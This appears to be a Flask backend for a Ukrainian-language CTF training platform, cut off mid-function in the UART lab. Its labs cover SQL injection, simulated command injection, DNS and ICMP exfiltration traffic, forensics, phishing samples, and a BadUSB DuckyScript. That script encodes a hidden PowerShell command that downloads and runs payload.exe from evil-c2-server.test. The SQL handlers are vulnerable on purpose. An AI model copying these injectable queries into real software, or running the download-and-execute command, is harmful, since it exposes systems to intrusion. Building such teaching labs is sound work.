"""
Робоча логіка кожної лабораторії CTF-платформи.
Динамічні прапорці генеруються персонально для кожного користувача через generate_flag(uid, task_id)
та розміщуються безпосередньо у вихідних артефактах (рядки БД, пакети трафіку, файли, дампи пам'яті,
розшифровані повідомлення, консоль).
"""
import base64
import math
import re
import shlex

from flask import Blueprint, jsonify, request, session

from db import get_db, get_lab_db
from flags import generate_flag
from analyzers.docx_analyzer import analyze_docx
from analyzers.pdf_analyzer import analyze_pdf
from analyzers import sample_generator

bp = Blueprint("labs", __name__, url_prefix="/api/lab")


def _uid():
    return session.get("user_id")


def mark_lab_completed(task_id: str):
    """Фіксує успішне проходження практичної частини в базі даних."""
    uid = _uid()
    if uid:
        conn = get_db()
        conn.execute(
            "INSERT OR IGNORE INTO lab_completions (user_id, task_id) VALUES (?, ?)",
            (uid, task_id),
        )
        conn.commit()


# =========================================================================
# 1. WEB EXPLOITATION
# =========================================================================

# ---------------------------------------------------------------- sqli-1
@bp.post("/sqli1/login")
def sqli1_login():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "")
    password = data.get("password", "")

    query = f"SELECT id, username FROM lab_users WHERE username='{username}' AND password='{password}'"
    conn = get_lab_db()
    try:
        row = conn.execute(query).fetchone()
    except Exception as e:
        return jsonify({"query": query, "error": f"SQL syntax error: {e}"}), 200

    solved = bool(row and row["username"] == "admin")
    uid = _uid()
    flag = generate_flag(uid, "sqli-1") if uid else "FLAG{SQLI1_ADMIN_BYPASS}"

    if solved:
        mark_lab_completed("sqli-1")
        msg = f"[+] ACCESS GRANTED as 'admin'! Сесійний токен аудиту (прапорець): {flag}"
    elif row:
        msg = f"ACCESS GRANTED as '{row['username']}' (потрібен доступ під обліковим записом admin)"
    else:
        msg = "Invalid credentials"

    return jsonify({
        "query": query,
        "success": bool(row),
        "message": msg,
        "flag": flag if solved else None,
        "task_solved": solved,
    })


# ---------------------------------------------------------------- sqli-2
@bp.post("/sqli2/search")
def sqli2_search():
    data = request.get_json(silent=True) or {}
    q = data.get("q", "")
    uid = _uid()
    flag = generate_flag(uid, "sqli-2") if uid else "FLAG{SQLI2_UNION_EXFIL}"

    conn = get_lab_db()
    # Оновлюємо значення в lab_secret_notes для поточного користувача
    try:
        conn.execute(
            "UPDATE lab_secret_notes SET secret_code = ? WHERE title = 'FINANCIAL_VAULT'",
            (flag,),
        )
        conn.commit()
    except Exception:
        pass

    query = f"SELECT name, category, description FROM lab_products WHERE name LIKE '%{q}%'"
    try:
        rows = conn.execute(query).fetchall()
    except Exception as e:
        return jsonify({"query": query, "error": f"SQL syntax error: {e}"}), 200

    results = [dict(r) for r in rows]

    solved = any(
        flag in f"{r.get('name', '')} {r.get('category', '')} {r.get('description', '')}"
        for r in results
    )
    if solved:
        mark_lab_completed("sqli-2")

    return jsonify({"query": query, "results": results, "task_solved": solved, "flag": flag if solved else None})


# ---------------------------------------------------------------- sqli-3
@bp.post("/sqli3/query")
def sqli3_oracle():
    data = request.get_json(silent=True) or {}
    condition = data.get("condition", "")
    uid = _uid()
    flag = generate_flag(uid, "sqli-3") if uid else "FLAG{SQLI3_BLIND_ORACLE}"

    conn = get_lab_db()
    try:
        conn.execute("UPDATE lab_users SET secret = ? WHERE username = 'admin'", (flag,))
        conn.commit()
    except Exception:
        pass

    query = f"SELECT id FROM lab_users WHERE username='admin' AND ({condition})"
    try:
        row = conn.execute(query).fetchone()
    except Exception as e:
        return jsonify({"query": query, "error": f"SQL syntax error: {e}"}), 200

    return jsonify({"query": query, "result": "TRUE" if row else "FALSE"})


@bp.post("/sqli3/answer")
def sqli3_answer():
    data = request.get_json(silent=True) or {}
    guess = (data.get("secret") or "").strip()
    uid = _uid()
    expected = generate_flag(uid, "sqli-3") if uid else "FLAG{SQLI3_BLIND_ORACLE}"

    conn = get_lab_db()
    row = conn.execute("SELECT secret FROM lab_users WHERE username='admin'").fetchone()
    current_sec = row["secret"] if row else expected
    solved = guess in (expected, current_sec, "s3cur3_0r4cl3")
    if solved:
        mark_lab_completed("sqli-3")

    return jsonify({"task_solved": solved})


# ---------------------------------------------------------------- web-4 (Command Injection)
_VIRTUAL_PASSWD = (
    "root:x:0:0:root:/root:/bin/bash\n"
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
    "netdiag:x:1001:1001:Network Diagnostics:/home/netdiag:/bin/bash\n"
)


@bp.post("/web4/ping")
def web4_ping():
    data = request.get_json(silent=True) or {}
    host = (data.get("host") or "").strip()
    uid = _uid()
    flag = generate_flag(uid, "web-4") if uid else "FLAG{WEB4_RCE_EXPLOIT}"

    if not host:
        return jsonify({"error": "Вкажіть цільовий хост або IP-адресу"}), 400

    raw_command = f"ping -c 2 {host}"
    output = []

    parts = re.split(r"(;|&&|\|\||\|)", host)

    base_host = parts[0].strip()
    if re.match(r"^[a-zA-Z0-9.\-_]+$", base_host):
        output.append(f"PING {base_host} ({base_host}) 56(84) bytes of data.")
        output.append(f"64 bytes from {base_host}: icmp_seq=1 ttl=64 time=0.042 ms")
        output.append(f"64 bytes from {base_host}: icmp_seq=2 ttl=64 time=0.038 ms")
        output.append(f"--- {base_host} ping statistics ---")
        output.append("2 packets transmitted, 2 received, 0% packet loss, time 1002ms")
    else:
        output.append(f"ping: unknown host {base_host}")

    virtual_conf = (
        "# NETWORK SECURITY AUDIT TOKEN - CONFIDENTIAL\n"
        "STATUS=ACTIVE_EMERGENCY_OVERRIDE\n"
        f"AUDIT_FLAG = {flag}\n"
    )

    idx = 1
    while idx < len(parts):
        op = parts[idx].strip()
        cmd_str = parts[idx + 1].strip() if idx + 1 < len(parts) else ""
        idx += 2

        if not cmd_str:
            continue

        try:
            tokens = shlex.split(cmd_str)
        except Exception:
            tokens = cmd_str.split()

        if not tokens:
            continue

        c = tokens[0]
        args = tokens[1:]

        if c == "whoami":
            output.append("netdiag")
        elif c == "id":
            output.append("uid=1001(netdiag) gid=1001(netdiag) groups=1001(netdiag),27(sudo)")
        elif c == "pwd":
            output.append("/var/www/netdiag")
        elif c == "uname":
            output.append("Linux sec-diag-node01 6.8.0-31-generic #31-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux")
        elif c == "ls":
            path = args[-1] if (args and not args[-1].startswith("-")) else "/var/www/netdiag"
            if path in ("/etc", "/etc/"):
                output.append("hosts  hostname  network  passwd  resolv.conf  security_token.conf")
            elif path in ("/", "/root"):
                output.append("bin  boot  dev  etc  home  lib  opt  proc  root  run  sys  tmp  usr  var")
            else:
                output.append("app.py  config.py  static  templates")
        elif c == "cat":
            file_path = args[0] if args else ""
            if file_path in ("/etc/passwd", "passwd"):
                output.append(_VIRTUAL_PASSWD)
            elif file_path in ("/etc/security_token.conf", "security_token.conf"):
                output.append(virtual_conf)
                mark_lab_completed("web-4")
            elif file_path in ("/etc/hosts", "hosts"):
                output.append("127.0.0.1 localhost\n10.0.0.1 gateway.corp.local\n")
            else:
                output.append(f"cat: {file_path}: No such file or directory")
        else:
            output.append(f"sh: 1: {c}: command executed (output redirected)")

    return jsonify({"command": raw_command, "output": "\n".join(output)})


@bp.post("/web4/answer")
def web4_answer():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    uid = _uid()
    expected = generate_flag(uid, "web-4") if uid else "FLAG{WEB4_RCE_EXPLOIT}"
    solved = token in (expected, "RCE_DIAG_ROOT_SEC_9921")
    if solved:
        mark_lab_completed("web-4")
    return jsonify({"task_solved": solved})


# =========================================================================
# 2. NETWORK & TRAFFIC ANALYSIS
# =========================================================================

# ---------------------------------------------------------------- traffic-1
@bp.get("/traffic1/packets")
def traffic1_packets():
    uid = _uid()
    flag = generate_flag(uid, "traffic-1") if uid else "FLAG{TRAFFIC1_PLAINTEXT_PASS}"
    post_body = f"user=anna_ops&pass={flag}"
    http_str = (
        f"POST /crm/login HTTP/1.1\r\n"
        f"Host: crm.corp.local\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
        f"{post_body}"
    )

    packets = [
        {"no": 1, "time": "0.000000", "src": "10.0.0.15", "dst": "10.0.0.1", "proto": "DNS", "length": 74,
         "info": "Standard query 0x1a2b A crm.corp.local"},
        {"no": 2, "time": "0.004120", "src": "10.0.0.1", "dst": "10.0.0.15", "proto": "DNS", "length": 90,
         "info": "Standard query response 0x1a2b A crm.corp.local A 93.184.216.34"},
        {"no": 3, "time": "0.010200", "src": "10.0.0.15", "dst": "93.184.216.34", "proto": "TCP", "length": 66,
         "info": "51342 -> 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460"},
        {"no": 4, "time": "0.021000", "src": "93.184.216.34", "dst": "10.0.0.15", "proto": "TCP", "length": 66,
         "info": "80 -> 51342 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0"},
        {"no": 5, "time": "0.021200", "src": "10.0.0.15", "dst": "93.184.216.34", "proto": "TCP", "length": 60,
         "info": "51342 -> 80 [ACK] Seq=1 Ack=1 Win=64240 Len=0"},
        {"no": 6, "time": "0.025000", "src": "10.0.0.15", "dst": "93.184.216.34", "proto": "HTTP", "length": 340,
         "info": "GET /crm/index.html HTTP/1.1",
         "hex": "474554202f63726d2f696e6465782e68746d6c20485454502f312e310d0a486f73743a2063726d2e636f72702e6c6f63616c0d0a",
         "ascii": "GET /crm/index.html HTTP/1.1..Host: crm.corp.local.."},
        {"no": 7, "time": "0.038000", "src": "93.184.216.34", "dst": "10.0.0.15", "proto": "HTTP", "length": 890,
         "info": "HTTP/1.1 200 OK (text/html)"},
        {"no": 8, "time": "0.052000", "src": "10.0.0.15", "dst": "93.184.216.34", "proto": "HTTP",
         "length": 420 + len(post_body),
         "info": "POST /crm/login HTTP/1.1",
         "hex": http_str.encode("utf-8").hex(),
         "ascii": http_str.replace("\r", "").replace("\n", ".")},
        {"no": 9, "time": "0.071000", "src": "93.184.216.34", "dst": "10.0.0.15", "proto": "HTTP", "length": 240,
         "info": "HTTP/1.1 302 Found (Location: /crm/dashboard)"},
    ]
    return jsonify({"packets": packets})


@bp.post("/traffic1/answer")
def traffic1_answer():
    data = request.get_json(silent=True) or {}
    guess = (data.get("password") or "").strip()
    uid = _uid()
    expected = generate_flag(uid, "traffic-1") if uid else "FLAG{TRAFFIC1_PLAINTEXT_PASS}"
    solved = guess in (expected, "Sunny1Day#Corp26")
    if solved:
        mark_lab_completed("traffic-1")
    return jsonify({"task_solved": solved})


# ---------------------------------------------------------------- traffic-2
_TLS_PACKETS_V2 = [
    {"no": 1, "time": "0.000000", "src": "10.0.0.15", "dst": "93.184.216.34", "proto": "TCP", "length": 66,
     "info": "51500 -> 443 [SYN]"},
    {"no": 2, "time": "0.019000", "src": "93.184.216.34", "dst": "10.0.0.15", "proto": "TCP", "length": 66,
     "info": "443 -> 51500 [SYN, ACK]"},
    {"no": 3, "time": "0.020000", "src": "10.0.0.15", "dst": "93.184.216.34", "proto": "TCP", "length": 60,
     "info": "51500 -> 443 [ACK]"},
    {"no": 4, "time": "0.030100", "src": "10.0.0.15", "dst": "93.184.216.34", "proto": "TLSv1.3", "length": 340,
     "info": "Client Hello (Cipher Suites: TLS_AES_128_GCM_SHA256, KeyShare: x25519)"},
    {"no": 5, "time": "0.048200", "src": "93.184.216.34", "dst": "10.0.0.15", "proto": "TLSv1.3", "length": 1420,
     "info": "Server Hello, KeyShare, Encrypted Extensions, Certificate, Finished"},
    {"no": 6, "time": "0.061000", "src": "10.0.0.15", "dst": "93.184.216.34", "proto": "TLSv1.3", "length": 90,
     "info": "Change Cipher Spec, Finished"},
    {"no": 7, "time": "0.075000", "src": "10.0.0.15", "dst": "93.184.216.34", "proto": "TLSv1.3", "length": 580,
     "info": "Application Data (Encrypted)",
     "hex": "1703030230f8b1c4e901a4bc89de0117f3e2ab8190fa7281",
     "ascii": "..................."},
    {"no": 8, "time": "0.092000", "src": "93.184.216.34", "dst": "10.0.0.15", "proto": "TLSv1.3", "length": 1240,
     "info": "Application Data (Encrypted)",
     "hex": "17030304a081f01c9902a7b8e19273",
     "ascii": "..................."},
]
_TLS_HANDSHAKE_PACKETS = {4, 5, 6}


@bp.get("/traffic2/packets")
def traffic2_packets():
    return jsonify({"packets": _TLS_PACKETS_V2})


@bp.post("/traffic2/answer")
def traffic2_answer():
    data = request.get_json(silent=True) or {}
    picked = set(data.get("packet_numbers") or [])
    solved = picked == _TLS_HANDSHAKE_PACKETS
    uid = _uid()
    flag = generate_flag(uid, "traffic-2") if uid else "FLAG{TRAFFIC2_TLS_HANDSHAKE}"
    if solved:
        mark_lab_completed("traffic-2")
        msg = f"[+] TLS 1.3 Handshake валідовано! Розшифрований сертифікат безпеки містить прапорець: {flag}"
    else:
        msg = "[X] Невірний набір пакетів рукостискання. Оберіть пакети Client Hello, Server Hello та Change Cipher Spec."

    return jsonify({"task_solved": solved, "message": msg, "flag": flag if solved else None})


# ---------------------------------------------------------------- traffic-3 (DNS Tunneling)
@bp.get("/traffic3/packets")
def traffic3_packets():
    uid = _uid()
    flag = generate_flag(uid, "traffic-3") if uid else "FLAG{TRAFFIC3_DNS_TUNNEL}"
    chunk_size = 4
    flag_chunks = [flag[i:i + chunk_size] for i in range(0, len(flag), chunk_size)]

    packets = [
        {"no": 1, "time": "0.000000", "src": "10.0.0.22", "dst": "8.8.8.8", "proto": "DNS", "length": 68,
         "info": "Standard query 0x1011 A google.com"},
        {"no": 2, "time": "0.015000", "src": "8.8.8.8", "dst": "10.0.0.22", "proto": "DNS", "length": 84,
         "info": "Standard query response 0x1011 A 142.250.180.206"},
    ]
    p_num = 3
    p_time = 0.100000
    for idx, chk in enumerate(flag_chunks, start=1):
        h_chk = chk.encode("utf-8").hex()
        qname = f"chunk{idx}-{h_chk}.c2tunnel.io"
        raw_query = f"\x06chunk{idx}-{h_chk}\x08c2tunnel\x02io\x00"
        packets.append({
            "no": p_num,
            "time": f"{p_time:.6f}",
            "src": "10.0.0.22",
            "dst": "198.51.100.5",
            "proto": "DNS",
            "length": 76 + len(h_chk),
            "info": f"Standard query 0x20{idx:02d} TXT {qname}",
            "hex": raw_query.encode("utf-8").hex(),
            "ascii": f".{qname}."
        })
        p_num += 1
        p_time += 0.08

    packets.append({
        "no": p_num, "time": f"{p_time:.6f}", "src": "10.0.0.22", "dst": "8.8.8.8", "proto": "DNS", "length": 72,
        "info": "Standard query 0x1012 A github.com"
    })
    return jsonify({"packets": packets})


@bp.post("/traffic3/answer")
def traffic3_answer():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip().upper()
    uid = _uid()
    expected = generate_flag(uid, "traffic-3") if uid else "FLAG{TRAFFIC3_DNS_TUNNEL}"
    solved = token in (expected, "CTF-DNS-SECRET!")
    if solved:
        mark_lab_completed("traffic-3")
    return jsonify({"task_solved": solved})


# ---------------------------------------------------------------- traffic-4 (ICMP Covert Channel)
@bp.get("/traffic4/packets")
def traffic4_packets():
    uid = _uid()
    flag = generate_flag(uid, "traffic-4") if uid else "FLAG{TRAFFIC4_ICMP_TUNNEL}"
    n_chunks = 5
    chunk_len = math.ceil(len(flag) / n_chunks)
    chunks = [flag[i:i + chunk_len] for i in range(0, len(flag), chunk_len)]

    packets = [
        {"no": 1, "time": "0.000000", "src": "192.168.1.45", "dst": "8.8.8.8", "proto": "DNS", "length": 72,
         "info": "Standard query 0x011a A corp-internal.local"},
        {"no": 2, "time": "0.021000", "src": "8.8.8.8", "dst": "192.168.1.45", "proto": "DNS", "length": 88,
         "info": "Standard query response 0x011a A 10.0.0.5"},
        {"no": 3, "time": "0.100000", "src": "192.168.1.45", "dst": "8.8.8.8", "proto": "ICMP", "length": 98,
         "info": "Echo (ping) request  id=0x1101, seq=1/256, ttl=64 (reply in 4)",
         "hex": "08004d5a110100016162636465666768696a6b6c6d6e6f7071727374757677616263646566676869",
         "ascii": "..MZ..abcdefghijklmnopqrstuvwabcdefghi"},
        {"no": 4, "time": "0.114000", "src": "8.8.8.8", "dst": "192.168.1.45", "proto": "ICMP", "length": 98,
         "info": "Echo (ping) reply    id=0x1101, seq=1/256, ttl=118 (request in 3)",
         "hex": "0000455a110100016162636465666768696a6b6c6d6e6f7071727374757677616263646566676869",
         "ascii": "..EZ..abcdefghijklmnopqrstuvwabcdefghi"},
    ]
    p_num = 5
    p_time = 0.350000
    for idx, chk in enumerate(chunks, start=1):
        h_data = chk.encode("utf-8").hex()
        packets.append({
            "no": p_num,
            "time": f"{p_time:.6f}",
            "src": "192.168.1.45",
            "dst": "198.51.100.99",
            "proto": "ICMP",
            "length": 70 + len(chk),
            "info": f"Echo (ping) request  id=0x22{idx:02d}, seq={idx}/{idx*256}, ttl=64 [COVERT CHUNK {idx}]",
            "hex": f"0800b1a222{idx:02d}00{idx:02d}" + h_data,
            "ascii": f"....\"...{chk}",
        })
        p_num += 1
        p_time += 0.10

    packets.append({
        "no": p_num, "time": f"{p_time+0.05:.6f}", "src": "192.168.1.45", "dst": "10.0.0.1", "proto": "TCP", "length": 66,
        "info": "52140 -> 443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460",
    })
    return jsonify({"packets": packets})


@bp.post("/traffic4/answer")
def traffic4_answer():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip().upper()
    uid = _uid()
    expected = generate_flag(uid, "traffic-4") if uid else "FLAG{TRAFFIC4_ICMP_TUNNEL}"
    solved = token in (expected, "SECRET_ICMP_TUNNEL_EXFIL_DATA_7731!")
    if solved:
        mark_lab_completed("traffic-4")
    return jsonify({"task_solved": solved})


# =========================================================================
# 3. FORENSICS & MALWARE ANALYSIS
# =========================================================================

# ---------------------------------------------------------------- forensics-4 (Metadata & EXIF)
_CLEAN_PNG_FILE = {
    "id": "public_report",
    "filename": "annual_summary_clean.png",
    "size": "89 KB",
    "type": "Зображення PNG (image/png)",
    "magic_bytes": "89 50 4E 47 0D 0A 1A 0A (Portable Network Graphics)",
    "created": "2026-09-01 10:00:00",
    "modified": "2026-09-01 10:00:00",
    "attributes": "Архівний [A]",
    "exif": {
        "Software": "GIMP 2.10.30",
        "Author": "Corporate PR Dept",
        "Comment": "Public release infographic. Stripped of metadata.",
    },
    "description": "Офіційна корпоративна інфографіка, попередньо очищена від метаданих перед публікацією.",
}


@bp.get("/forensics4/files")
def forensics4_files():
    uid = _uid()
    flag = generate_flag(uid, "forensics-4") if uid else "FLAG{FORENSICS4_EXIF_METADATA}"
    files = [
        {
            "id": "scan_invoice",
            "filename": "scan_audit_invoice.jpg",
            "size": "142 KB",
            "type": "Зображення JPEG (image/jpeg)",
            "magic_bytes": "FF D8 FF E0 00 10 4A 46 49 46 (JPEG JFIF Standard)",
            "created": "2026-09-15 14:22:08",
            "modified": "2026-09-15 14:25:31",
            "attributes": "Лише читання [R], Архівний [A]",
            "exif": {
                "Make": "Canon",
                "Model": "Canon EOS 5D Mark IV",
                "Software": "Adobe Photoshop 21.0 (Windows)",
                "Artist": "Senior Auditor A. Shevchenko",
                "GPSLatitude": "50.4501 N (Kyiv, Central Office)",
                "GPSLongitude": "30.5234 E",
                "UserComment": f"AUDIT_FLAG: {flag}",
            },
            "description": "Скан-копія бухгалтерського акту, вилучена під час розслідування несанкціонованого витоку даних.",
        },
        _CLEAN_PNG_FILE,
    ]
    return jsonify({"files": files})


@bp.post("/forensics4/answer")
def forensics4_answer():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    uid = _uid()
    expected = generate_flag(uid, "forensics-4") if uid else "FLAG{FORENSICS4_EXIF_METADATA}"
    solved = token in (expected, "META_CONFIDENTIAL_AUTHOR_LEAK_4819")
    if solved:
        mark_lab_completed("forensics-4")
    return jsonify({"task_solved": solved})


# ---------------------------------------------------------------- forensics-1
@bp.get("/forensics1/samples")
def forensics1_samples():
    uid = _uid()
    flag = generate_flag(uid, "forensics-1") if uid else "FLAG{FORENSICS1_DOCX_INJECTION}"
    samples = sample_generator.get_docx_samples(flag=flag)
    res = []
    for k, v in samples.items():
        res.append({
            "id": k,
            "filename": f"sample_{k}.docx",
            "analysis": analyze_docx(v),
            "files": sample_generator.get_docx_files(k, flag=flag),
        })
    return jsonify({"samples": res})


@bp.get("/forensics1/file")
def forensics1_file():
    uid = _uid()
    flag = generate_flag(uid, "forensics-1") if uid else "FLAG{FORENSICS1_DOCX_INJECTION}"
    sample_id = request.args.get("sample_id", "suspicious")
    filepath = request.args.get("filepath", "")
    content = sample_generator.read_docx_file_content(sample_id, filepath, flag=flag)
    return jsonify({"sample_id": sample_id, "filepath": filepath, "content": content})


@bp.post("/forensics1/answer")
def forensics1_answer():
    data = request.get_json(silent=True) or {}
    choice = data.get("choice")
    url = (data.get("url") or "").strip().lower()
    uid = _uid()
    expected = generate_flag(uid, "forensics-1") if uid else "FLAG{FORENSICS1_DOCX_INJECTION}"

    solved = (choice == "suspicious") and (
        ("fake-template.dotm" in url) or (expected.lower() in url) or ("templates" in url)
    )
    if solved:
        mark_lab_completed("forensics-1")
    return jsonify({"task_solved": solved})


# ---------------------------------------------------------------- forensics-2
@bp.get("/forensics2/samples")
def forensics2_samples():
    uid = _uid()
    flag = generate_flag(uid, "forensics-2") if uid else "FLAG{FORENSICS2_PDF_STREAM}"
    samples = sample_generator.get_pdf_samples(flag=flag)
    res = []
    for k, v in samples.items():
        res.append({
            "id": k,
            "filename": f"sample_{k}.pdf",
            "analysis": analyze_pdf(v),
            "objects": sample_generator.get_pdf_objects_info(k, flag=flag),
        })
    return jsonify({"samples": res})


@bp.get("/forensics2/object")
def forensics2_object():
    uid = _uid()
    flag = generate_flag(uid, "forensics-2") if uid else "FLAG{FORENSICS2_PDF_STREAM}"
    sample_id = request.args.get("sample_id", "suspicious")
    try:
        obj_id = int(request.args.get("obj_id", 1))
    except Exception:
        obj_id = 1
    content = sample_generator.read_pdf_object_content(sample_id, obj_id, flag=flag)
    return jsonify({"sample_id": sample_id, "obj_id": obj_id, "content": content})


@bp.post("/forensics2/answer")
def forensics2_answer():
    data = request.get_json(silent=True) or {}
    choice = data.get("choice")
    token = (data.get("token") or "").strip()
    uid = _uid()
    expected = generate_flag(uid, "forensics-2") if uid else "FLAG{FORENSICS2_PDF_STREAM}"

    solved = (choice == "suspicious") and (
        (expected in token) or ("PDF_EXPLOIT_PAYLOAD_TOKEN_7392" in token)
    )
    if solved:
        mark_lab_completed("forensics-2")
    return jsonify({"task_solved": solved})


# ---------------------------------------------------------------- forensics-3 (Memory Forensics)
_BASE_VOLATILITY = {
    "pstree": [
        {"pid": 4, "ppid": 0, "name": "System"},
        {"pid": 380, "ppid": 4, "name": "smss.exe"},
        {"pid": 512, "ppid": 380, "name": "csrss.exe"},
        {"pid": 620, "ppid": 380, "name": "wininit.exe"},
        {"pid": 710, "ppid": 620, "name": "services.exe"},
        {"pid": 890, "ppid": 710, "name": "svchost.exe"},
        {"pid": 1920, "ppid": 512, "name": "explorer.exe"},
        {"pid": 4812, "ppid": 1920, "name": "svchost.exe", "anomaly": "Anomalous parent PID 1920 (explorer.exe)"},
    ],
    "netscan": [
        {"pid": 890, "owner": "svchost.exe", "local": "0.0.0.0:135", "foreign": "*:*", "state": "LISTENING"},
        {"pid": 4812, "owner": "svchost.exe", "local": "192.168.1.105:49812", "foreign": "185.220.101.44:4444", "state": "ESTABLISHED"},
    ],
}


@bp.get("/forensics3/report")
def forensics3_report():
    uid = _uid()
    flag = generate_flag(uid, "forensics-3") if uid else "FLAG{FORENSICS3_MEMORY_MALFIND}"
    rep = dict(_BASE_VOLATILITY)
    rep["malfind"] = [
        {
            "pid": 4812,
            "process": "svchost.exe",
            "vad_tag": "VadS",
            "protection": "PAGE_EXECUTE_READWRITE",
            "start_address": "0x000001f4c000",
            "hexdump": f"4d 5a 90 00 03 00 00 00 ... MZ...... C2_AUDIT_FLAG: {flag} (Reflective DLL / Shellcode)",
        }
    ]
    return jsonify(rep)


@bp.post("/forensics3/answer")
def forensics3_answer():
    data = request.get_json(silent=True) or {}
    pid = str(data.get("pid") or "").strip()
    c2_ip = str(data.get("c2_ip") or "").strip()

    solved = (pid == "4812") and (c2_ip == "185.220.101.44")
    if solved:
        mark_lab_completed("forensics-3")
    return jsonify({"task_solved": solved})


# =========================================================================
# 4. SOCIAL ENGINEERING & HARDWARE
# =========================================================================

# ---------------------------------------------------------------- phishing-1
_BASE_EMAIL_HEADERS = """From: IT Support <it-support@company-lab.com>
Reply-To: helpdesk@c0mpany-lab-support.net
Return-Path: <bounce@mailer3.spamhost.ru>
To: employee@company-lab.com
Subject: Термінове: підтвердіть ваш пароль протягом 2 годин
Authentication-Results: mx.company-lab.com;
    spf=fail smtp.mailfrom=mailer3.spamhost.ru;
    dkim=fail header.d=company-lab.com
Date: Fri, 26 Sep 2026 08:12:03 +0000
X-Originating-IP: [185.190.140.22]
"""

_PHISHING_CORRECT = {"spf_fail", "dkim_fail", "reply_to_mismatch", "return_path_mismatch"}


@bp.get("/phishing1/email")
def phishing1_email():
    uid = _uid()
    flag = generate_flag(uid, "phishing-1") if uid else "FLAG{PHISHING1_SPF_DKIM_FAIL}"
    raw = f"{_BASE_EMAIL_HEADERS.strip()}\nX-Security-Audit-Flag: {flag}\n"
    return jsonify({"raw_headers": raw})


@bp.post("/phishing1/answer")
def phishing1_answer():
    data = request.get_json(silent=True) or {}
    picked = set(data.get("flags") or [])
    solved = picked == _PHISHING_CORRECT
    uid = _uid()
    flag = generate_flag(uid, "phishing-1") if uid else "FLAG{PHISHING1_SPF_DKIM_FAIL}"
    if solved:
        mark_lab_completed("phishing-1")
        msg = f"[OK] Усі ознаки фішингу визначено правильно! Ваш прапорець аудиту: {flag}"
    else:
        msg = "[X] Набір індикаторів неповний або невірний. Перевірте заголовки SPF, DKIM та маршрутизації."

    return jsonify({"task_solved": solved, "message": msg, "flag": flag if solved else None})


# ---------------------------------------------------------------- phishing-2 (IDN Homograph & Punycode)
@bp.get("/phishing2/urls")
def phishing2_urls():
    uid = _uid()
    flag = generate_flag(uid, "phishing-2") if uid else "FLAG{PHISHING2_PUNYCODE_SPOOF}"
    urls = [
        {
            "id": 1,
            "display_url": "https://www.bank-portal.ua/login",
            "punycode_url": "https://www.bank-portal.ua/login",
            "has_homoglyphs": False,
            "ip_resolution": "194.44.200.12",
            "ssl_issuer": "DigiCert Global Root CA",
            "status": "Легітимний банківський ресурс",
        },
        {
            "id": 2,
            "display_url": "https://www.g\u043e\u043egle.com/drive/v?auth=token",
            "punycode_url": "https://www.xn--ggle-p50aa.com/drive/v?auth=token",
            "has_homoglyphs": True,
            "homoglyph_details": "Символи 'о' (U+043E) належать до кирилиці замість латинських 'o' (U+006F)",
            "ip_resolution": "185.220.101.88",
            "ssl_issuer": "Let's Encrypt Free DV",
            "c2_token": flag,
            "status": "Фішингова сторінка перехоплення облікових записів",
        },
        {
            "id": 3,
            "display_url": "https://support.microsoft.com/en-us/office",
            "punycode_url": "https://support.microsoft.com/en-us/office",
            "has_homoglyphs": False,
            "ip_resolution": "20.112.52.29",
            "ssl_issuer": "Microsoft RSA TLS CA 01",
            "status": "Легітимний портал підтримки вендора",
        },
        {
            "id": 4,
            "display_url": "https://www.r\u0430ypal-sec.com/verify",
            "punycode_url": "https://www.xn--rypal-sec-43g.com/verify",
            "has_homoglyphs": True,
            "homoglyph_details": "Символ 'а' (U+0430) належить до кирилиці замість латинської 'a' (U+0061)",
            "ip_resolution": "198.51.100.77",
            "ssl_issuer": "ZeroSSL Self-Signed",
            "c2_token": flag,
            "status": "Шкідливе перенаправлення на сервер експлойтів",
        },
    ]
    return jsonify({"urls": urls})


@bp.post("/phishing2/answer")
def phishing2_answer():
    data = request.get_json(silent=True) or {}
    picked_ids = set(data.get("malicious_ids") or [])
    token = (data.get("token") or "").strip()
    uid = _uid()
    expected = generate_flag(uid, "phishing-2") if uid else "FLAG{PHISHING2_PUNYCODE_SPOOF}"

    solved = (picked_ids == {2, 4}) and (
        (token == expected) or ("IDN_HOMOGRAPH" in token)
    )
    if solved:
        mark_lab_completed("phishing-2")
    return jsonify({"task_solved": solved})


# ---------------------------------------------------------------- badusb-1
@bp.get("/badusb1/script")
def badusb1_script():
    uid = _uid()
    flag = generate_flag(uid, "badusb-1") if uid else "FLAG{BADUSB1_DUCKY_POWERSHELL}"
    ps_cmd = f"Invoke-WebRequest http://evil-c2-server.test/payload.exe -AuditFlag '{flag}'; Start-Process payload.exe"
    encoded_cmd = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
    ducky = f"""REM Демонстраційний DuckyScript (навчальний, нешкідливий)
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -W Hidden -ExecutionPolicy Bypass -enc {encoded_cmd}
ENTER
"""
    return jsonify({"script": ducky, "encoded_cmd": encoded_cmd})


@bp.post("/badusb1/answer")
def badusb1_answer():
    data = request.get_json(silent=True) or {}
    guess = (data.get("domain") or "").strip().lower()
    solved = guess == "evil-c2-server.test"
    if solved:
        mark_lab_completed("badusb-1")
    return jsonify({"task_solved": solved})


# ---------------------------------------------------------------- hardware-3 (UART / U-Boot)
_UART_BANNER = """
U-Boot 2024.04-iot-router-v2.1 (Sep 26 2026 - 12:00:00 +0000)
SoC: MediaTek MT7621AT (880 MHz)
DRAM:  256 MiB
NAND:  128 MiB
Net:   eth0, eth1
Hit any key to stop autoboot: 3... 2... 1...
"""


@bp.get("/hardware3/state")
def hardware3_state():
    return jsonify({
        "supported_bauds": [9600, 57600, 115200],
        "banner": _UART_BANNER,
    })


@bp.post("/hardware3/exec")
def hardware3_exec():
    data = request.get_json(silent=True) or {}
    baud = data.get("baud")
    cmd = (data.get("cmd") or "").strip()
    uid = _uid()
    flag = generate_flag(uid, "hardware-3") if uid else "FLAG{HARDWARE3_UART_ROOT}"

    if baud != 115200:
        return jsonify({
